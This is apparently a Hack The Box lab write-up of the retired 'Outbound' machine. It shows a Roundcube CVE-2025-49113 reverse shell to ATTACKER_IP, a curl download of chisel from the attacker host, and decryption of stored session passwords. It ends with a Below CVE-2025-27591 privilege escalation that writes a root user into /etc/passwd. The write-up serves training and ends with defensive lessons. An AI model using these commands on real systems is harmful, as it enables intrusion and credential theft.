---
title: 📣 HTB Outbound Write-up
name: Outbound
date: 2025-11-15
last_modified_at: 2025-11-15
difficulty: Easy
os: Linux
skills: Enumeration, Reverse Shell, Chisel Port Forwarding, Privilege Escalation
tools: rustscan, nmap, nc, RevShells, CVE-2025-49113, chisel, mysql, CVE-2025-27591
published: true
---

![](images/Pasted%20image%2020250713204019.png)

```
Machine Information

As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2
```

## 📝 Summary

I began Outbound by accessing the Roundcube Webmail interface using Tyler’s credentials. The server was running **Roundcube Webmail 1.6.10**, which is vulnerable to **CVE-2025-49113**, a **Post-Authentication Remote Command Execution (RCE)** flaw.

Leveraging this vulnerability, I obtained a reverse shell as the `www-data` user. From there, I used **Chisel** to forward port **3306** (MySQL/MariaDB) back to my attack machine. The database contained session data for Jacob; after extracting and Base64-decoding the session blob, I used Roundcube’s internal `decrypt` function to recover Jacob’s plaintext password.

With those credentials, I logged into Jacob’s mailbox via Roundcube. An email from Tyler revealed Jacob’s new system password following recent password-policy changes.

Using this password, I authenticated to the target over SSH as Jacob.

Another e-mail—from Mel—indicated that Jacob had been granted access to the **Below** resource-monitoring tool, which he could execute via `sudo`. The system was running **Below 0.8.0**, vulnerable to **CVE-2025-27591**, a known **privilege escalation** issue.

Exploiting this vulnerability allowed me to escalate to **root** and fully compromise the machine.

## 📧 Roundcube Webmail
### 🔎 Recon

**Initial scan** revealed only two ports open:
- `22/tcp`: OpenSSH 9.6p1
- `80/tcp`: nginx 1.24.0

```
fcoomans@kali:~/htb/outbound$ rustscan -a 10.10.11.77 --tries 5 --ulimit 10000 -- -sCV -oA outbound_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports faster than you can say 'SYN ACK'

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.77:22
Open 10.10.11.77:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA outbound_tcp_all" on ip 10.10.11.77
Depending on the complexity of the script, results may take some time to appear.

<SNIP>

Nmap scan report for 10.10.11.77
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2025-07-14 01:33:18 SAST for 11s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

After pointing `outbound.htb` and `mail.outbound.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/outbound$ grep outbound.htb /etc/hosts
10.10.11.77     outbound.htb mail.outbound.htb
```

I open http://mail.outbound.htb and see that it's running Roundcube Webmail.  
Logging in with the supplied credentials, `tyler:LhKL1o9Nm3X2` and then clicking on the `About` link shows that the server is running Roundcube Webmail 1.6.10.

![](images/Pasted%20image%2020251115094210.png)

#### 🐞 CVE-2025-49113

A quick Google search for `roundcube webmail 1.6.10 exploit` led to **CVE-2025-49113**, a known **Post-Auth Remote Command Execution (RCE) via PHP Object Deserialization** vulnerability.

A proof of concept for the CVE was found at https://github.com/fearsoff-org/CVE-2025-49113, and the repo was cloned.

```
fcoomans@kali:~/htb/outbound$ git clone https://github.com/fearsoff-org/CVE-2025-49113.git
Cloning into 'CVE-2025-49113'...
remote: Enumerating objects: 8, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 8 (delta 1), reused 8 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (8/8), 7.33 KiB | 2.44 MiB/s, done.
Resolving deltas: 100% (1/1), done.
```

### 🧪 Exploitation

I used https://www.revshells.com to generate a `bash -i` reverse shell.

![](images/Pasted%20image%2020251115095123.png)

The `nc` listener is started on port `4444`.

```
fcoomans@kali:~/htb/outbound$ rlwrap nc -lvnp 4444    
listening on [any] 4444 ...
```

The reverse shell payload is sent to the server using the CVE-2025-49113 PoC script.

```
fcoomans@kali:~/htb/outbound/CVE-2025-49113$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\""
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Retrieving CSRF token and session cookie...

### Authenticating user: tyler

### Authentication successful

### Command to be executed: 
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"

### Injecting payload...

### End payload: http://mail.outbound.htb/?_from=edit-%21%C6%22%C6%3B%C6i%C6%3A%C60%C6%3B%C6O%C6%3A%C61%C66%C6%3A%C6%22%C6C%C6r%C6y%C6p%C6t%C6_%C6G%C6P%C6G%C6_%C6E%C6n%C6g%C6i%C6n%C6e%C6%22%C6%3A%C61%C6%3A%C6%7B%C6S%C6%3A%C62%C66%C6%3A%C6%22%C6%5C%C60%C60%C6C%C6r%C6y%C6p%C6t%C6_%C6G%C6P%C6G%C6_%C6E%C6n%C6g%C6i%C6n%C6e%C6%5C%C60%C60%C6_%C6g%C6p%C6g%C6c%C6o%C6n%C6f%C6%22%C6%3B%C6S%C6%3A%C65%C64%C6%3A%C6%22%C6b%C6a%C6s%C6h%C6+%C6-%C6c%C6+%C6%22%C6b%C6a%C6s%C6h%C6+%C6-%C6i%C6+%C6%3E%C6%26%C6+%C6%2F%C6d%C6e%C6v%C6%2F%C6t%C6c%C6p%C6%2F%C61%C60%C6%5C%C62%C6e%C61%C60%C6%5C%C62%C6e%C61%C65%C6%5C%C62%C6e%C61%C67%C64%C6%2F%C64%C64%C64%C64%C6+%C60%C6%3E%C6%26%C61%C6%22%C6%3B%C6%23%C6%22%C6%3B%C6%7D%C6i%C6%3A%C60%C6%3B%C6b%C6%3A%C60%C6%3B%C6%7D%C6%22%C6%3B%C6%7D%C6%7D%C6&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload

### Payload injected successfully

### Executing payload...

```

#### 👣 Foothold as www-data

And the `nc` listener caught the shell for user `wwww-data`.

```
fcoomans@kali:~/htb/outbound$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.77] 37928
bash: cannot set terminal process group (247): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/var/www/html/roundcube/public_html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### 🦭 MariaDB

mySQL/MariaDB was listening on the localhost.

```
www-data@mail:/var/www/html/roundcube/public_html$ ss -tlpn
ss -tlpn
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      100          0.0.0.0:995       0.0.0.0:*
LISTEN 0      100          0.0.0.0:993       0.0.0.0:*
LISTEN 0      100          0.0.0.0:143       0.0.0.0:*
LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*
LISTEN 0      100          0.0.0.0:110       0.0.0.0:*
LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    users:(("nginx",pid=207,fd=5),("nginx",pid=206,fd=5))
LISTEN 0      100        127.0.0.1:25        0.0.0.0:*
LISTEN 0      100             [::]:995          [::]:*
LISTEN 0      100             [::]:993          [::]:*
LISTEN 0      100            [::1]:25           [::]:*
LISTEN 0      100             [::]:143          [::]:*
LISTEN 0      100             [::]:110          [::]:*
```

I shared the `chisel` binaries found under `/usr/share/chisel-common-binaries` on Kali.

```
fcoomans@kali:~/htb/outbound$ python -m http.server -d /usr/share/chisel-common-binaries
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And downloaded the binary to `/tmp/fc` and changed the permission to make the binary executable.

```
www-data@mail:/tmp/fc$ curl -s http://ATTACKER_IP:8000/chisel_1.10.1_linux_amd64 -o chisel
<0.10.14.95:8000/chisel_1.10.1_linux_amd64 -o chisel

www-data@mail:/tmp/fc$ chmod +x chisel
chmod +x chisel
```

A `chisel` server was started on the attack host with the `--reverse` option, which allowed the connecting client to setup reverse port forwards.

```
fcoomans@kali:~/htb/outbound$ /usr/share/chisel-common-binaries/chisel_1.10.1_linux_amd64 server --reverse
2025/07/14 02:18:20 server: Reverse tunnelling enabled
2025/07/14 02:18:20 server: Fingerprint 1FIptnWcii5EK/7Q4b+1xLadFSKoEMZ0i+MraHYMg0U=
2025/07/14 02:18:20 server: Listening on http://0.0.0.0:8080
```

The `chisel` client was then started on the target, and port 3306 was forwarded to the attack host.

```
www-data@mail:/tmp/fc$ ./chisel client ATTACKER_IP:8080 R:3306
./chisel client ATTACKER_IP:8080 R:3306
2025/07/13 16:26:35 client: Connecting to ws://ATTACKER_IP:8080
2025/07/13 16:26:37 client: Connected (Latency 172.940161ms)
```

The Roundcube `config.inc.php` config file had the credentials to log into the mySQL/MariaDB database (`mysql://roundcube:RCDBPass2025@localhost/roundcube`).

```
www-data@mail:/var/www/html/roundcube/config$ cat config.inc.php
cat config.inc.php
<?php

<SNIP>

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

<SNIP>
```

The `config.inc.php` file also showed the DES key and the Cipher method used for decrypting user passwords.

```
// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// Encryption algorithm. You can use any method supported by OpenSSL.
// Default is set for backward compatibility to DES-EDE3-CBC,
// but you can choose e.g. AES-256-CBC which we consider a better choice.
$config['cipher_method'] = 'DES-EDE3-CBC';

<SNIP>
```

`rcube.php` revealed the `decrypt` function used to decrypt the encrypted cipher text.

```php
www-data@mail:/var/www/html/roundcube/program/lib/Roundcube$ cat rcube.php
<SNIP>
    /**
     * Decrypt a string
     *
     * @param string $cipher Encrypted text
     * @param string $key    Encryption key to retrieve from the configuration, defaults to 'des_key'
     * @param bool   $base64 Whether or not input is base64-encoded
     *
     * @return string|false Decrypted text, false on error
     */
    public function decrypt($cipher, $key = 'des_key', $base64 = true)
    {
        // @phpstan-ignore-next-line
        if (!is_string($cipher) || !strlen($cipher)) {
            return false;
        }

        if ($base64) {
            $cipher = base64_decode($cipher);
            if ($cipher === false) {
                return false;
            }
        }

        $ckey    = $this->config->get_crypto_key($key);
        $method  = $this->config->get_crypto_method();
        $iv_size = openssl_cipher_iv_length($method);
        $tag     = null;

        if (preg_match('/^##(.{16})##/s', $cipher, $matches)) {
            $tag    = $matches[1];
            $cipher = substr($cipher, strlen($matches[0]));
        }

        $iv = substr($cipher, 0, $iv_size);

        // session corruption? (#1485970)
        if (strlen($iv) < $iv_size) {
            return false;
        }

        $cipher = substr($cipher, $iv_size);
        $clear  = openssl_decrypt($cipher, $method, $ckey, OPENSSL_RAW_DATA, $iv, $tag);

        return $clear;
    }
<SNIP>
```

I used `mysql` to connect to the MariaDB database using the credentials `roundcube:RCDBPass2025@localhost` and looked at the tables in the `roundcube` database.

```
fcoomans@kali:~/htb/outbound/CVE-2025-49113$ mysql -h 127.0.0.1 --skip-ssl -u roundcube -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 128
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use roundcube;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [roundcube]> show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.154 sec)
```

Querying the `users` table showed that 3 users have been configured on Roundcube: `jacob`, `mel` and `tyler`.  
The `users` table didn't contain any credentials for these 3 users.

```
MariaDB [roundcube]> select * from users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                               |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-07-13 16:25:59 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}         |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}         |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-07-13 16:27:46 | 2025-06-11 07:51:22 |                    1 | en_US    | a:2:{s:11:"client_hash";s:16:"2oQfAr
YTT1jf7FUh";i:0;b:0;} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
3 rows in set (0.154 sec)
```

But the encrypted credentials are stored in the sessions.

```
MariaDB [roundcube]> describe session;
+---------+--------------+------+-----+---------------------+-------+
| Field   | Type         | Null | Key | Default             | Extra |
+---------+--------------+------+-----+---------------------+-------+
| sess_id | varchar(128) | NO   | PRI | NULL                |       |
| changed | datetime     | NO   | MUL | 1000-01-01 00:00:00 |       |
| ip      | varchar(40)  | NO   |     | NULL                |       |
| vars    | mediumtext   | NO   |     | NULL                |       |
+---------+--------------+------+-----+---------------------+-------+
4 rows in set (0.156 sec)

MariaDB [roundcube]> select vars from session;
<SNIP>

| vars

<SNIP>

| bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |

<SNIP>

1 row in set (0.181 sec)
```

I take the first session info and use CyberChef to do a base64 decode.  This shows the encrypted password `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/` for user `jacob`.

![](images/Pasted%20image%2020250713192258.png)

I copied the Roundcube `decrypt` PHP function to `decrypt.php` and used it to decrypt the password. 

```php
fcoomans@kali:~/htb/outbound$ cat decrypt.php
<?php
function decrypt($cipher, $base64 = true)
{
    // @phpstan-ignore-next-line
    if (!is_string($cipher) || !strlen($cipher)) {
        return false;
    }

    if ($base64) {
        $cipher = base64_decode($cipher);
        if ($cipher === false) {
            return false;
        }
    }

    $ckey    = 'rcmail-!24ByteDESkey*Str';
    $method  = 'DES-EDE3-CBC';
    $iv_size = openssl_cipher_iv_length($method);
    $tag     = null;

    if (preg_match('/^##(.{16})##/s', $cipher, $matches)) {
        $tag    = $matches[1];
        $cipher = substr($cipher, strlen($matches[0]));
    }

    $iv = substr($cipher, 0, $iv_size);

    // session corruption? (#1485970)
    if (strlen($iv) < $iv_size) {
        return false;
    }

    $cipher = substr($cipher, $iv_size);
    $clear  = openssl_decrypt($cipher, $method, $ckey, OPENSSL_RAW_DATA, $iv, $tag);

    return $clear;
}

$plaintext = decrypt('L7Rv00A8TuwJAr67kITxxcSgnIk25Am/');
echo "Decrypted password: $plaintext\n";

?>
```

Running the script revealed Jacob's password as `595mO8DmwGeD`.

```
fcoomans@kali:~/htb/outbound$ php decrypt.php
Decrypted password: 595mO8DmwGeD
```

#### 🔼 PrivEsc to Jacob

I re-opened http://mail.outbhound.htb and logged in with Jacob's credentials (`jacob:595mO8DmwGeD`).  
Jacob's mailbox contained two e-mails.  One email said that Jacob's account password has been changed to `gY4Wr3a1evp4`.

![](images/Pasted%20image%2020250713192447.png)

The other email stated that Jacob was granted privileges to inspect the logs of the Below resource monitoring tool.

![](images/Pasted%20image%2020250713192402.png)

I tried to SSH to the server using Jacob's credentials (`jacob:gY4Wr3a1evp4`) and gained shell access!

```
fcoomans@kali:~/htb/outbound$ ssh jacob@outbound.htb
jacob@mail.outbound.htb's password:

<SNIP>

jacob@outbound:~$ id
uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)
```

### 💰 Post Exploitation

#### 🚩 user.txt

Jacob held the `user.txt` flag.

```
jacob@outbound:~$ cat user.txt
634dc4c049bbacbc5d3ebd0905d3683f
```

## 💎 Below

### 🔎 Recon

`sudo -l` showed that Jacob could run the `/usr/bin/below` program using `sudo`, but could not run debugs or mess with the config of the program.

```
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

Running the program,

```
jacob@outbound:~$ sudo /usr/bin/below
```

Opened a live process monitor.  It also showed that Below 0.8.0 was used.

![](images/Pasted%20image%2020251115114403.png)
#### 🐞 CVE-2025-27591

A quick Google search for `below 0.8.0 privilege escalation` led to **CVE-2025-27591**, a known **Privilege Escalation** vulnerability in Below before v0.9.0, due to a world writable `/var/log/below` directory.

I checked, and this directory was indeed world-writable.

```
jacob@outbound:~$ ls -ld /var/log/below/
drwxrwxrwx 3 root root 4096 Jul 14 16:39 /var/log/below/
```

### 🧪 Exploitation

A proof of concept for the CVE was found at https://github.com/obamalaolu/CVE-2025-27591.  This was a simple shell script.  

The script did the following:
1. Make a backup of `/etc/passwd` under `/tmp/passwd.bak`.  This was **extremely** important as this is a destructive exploit that overwrote `/etc/passwd`.  The backup must be restored after the exploit.
2. Created a password file entry for the user `haxor` with password `hacked123`, which it wrote to a temporary file.  
3. The Below log file `/var/log/below/error_root.log` was removed, since the `/var/log` directory was world writable.
4. The `/var/log/below/error_root.log` error log was then linked to `/etc/passwd`.  This meant that anything written to `/var/log/below/error_root.log` would now be written to `/etc/passwd` instead.
5. A `sudo /usr/bin/below` command was run with an invalid time to recreate the error log file.  This would overwrite `/etc/passwd`, but more importantly, change the file permissions and make it writable.
6. The malicious user entry was then written to the `/etc/passwd`, and `su haxor` was then run to switch to the new `haxor` user.

The `/tmp/passwd.bak` backup file usually has to be moved to `/etc/passwd` to prevent breaking the system, before anything else is done.  
Luckily, the machine creator automated this.  So, I didn't have to restore the file manually.

I used `vim` to create the file `exploit.sh`, with the contents from https://raw.githubusercontent.com/obamalaolu/CVE-2025-27591/refs/heads/main/CVE-2025-27591.sh.  
The script file was then made executable.

```
jacob@outbound:/dev/shm$ vim exploit.sh
jacob@outbound:/dev/shm$ chmod +x exploit.sh
```

The script was run, and I entered the password `hacked123` when prompted.

```
jacob@outbound:/dev/shm$ ./exploit.sh
[*] CVE-2025-27591 Privilege Escalation Exploit
[*] Checking sudo permissions...
[*] Backing up /etc/passwd to /tmp/passwd.bak
[*] Generating password hash...
[*] Creating malicious passwd line...
[*] Linking /var/log/below/error_root.log to /etc/passwd
[*] Triggering 'below' to write to symlinked log...
[*] Injecting malicious user into /etc/passwd
[*] Try switching to 'haxor' using password: hacked123
Password:
```

To confirm that `/var/log/below/error_root.log` was linked to `/etc/passwd` and contained the new `haxor` user, I ran this command before the automated script restored `/etc/passwd`.  
Great, this is exactly what the script said it would do.

```
haxor@outbound:/dev/shm# ls -lha /etc/passwd /var/log/below/error_root.log && grep haxor /etc/passwd
-rw-rw-rw- 1 haxor root  138 Nov 15 10:12 /etc/passwd
lrwxrwxrwx 1  1002 jacob  11 Nov 15 10:12 /var/log/below/error_root.log -> /etc/passwd
haxor:$6$oWemOe5SFaBrsR7B$ntvwEBDJG22QjN3kLxVOnhfQyAwbvHzr9K5JIjP5jNWEJid0AqgsfK72e9f5XszF61KBM1EciKqSk98uasgJy1:0:0:root:/root:/bin/bash
```

This gave me root access on the target.

```
haxor@outbound:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
```

### 💰 Post Exploitation
#### 🏆 root.txt

`root` held the `root.txt` flag.

```
haxor@outbound:/dev/shm# cd /root
haxor@outbound:~# cat root.txt
89d93c51138b528d20fab6d2619fd990
```

Turns out when you don’t update Roundcube or Below… attackers don’t stay _around_ or _below_—they go straight to root.

And `Outbound has been Pwned!` 🎉

![](images/Pasted%20image%2020250713203150.png)

## 📚 Lessons Learned

- **Keep software up to date:** Both Roundcube and Below were running outdated versions containing publicly known vulnerabilities, directly enabling the compromise of the system.
- **Avoid sending passwords via email:** Credentials transmitted in cleartext over email become a single point of failure if any mailbox is accessed by an attacker.
- **Review and restrict sudo permissions:** Granting sudo access to applications without verifying their security posture can expose privilege escalation paths, as seen with Below.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username is intentionally used throughout this write-up to build my cybersecurity brand.
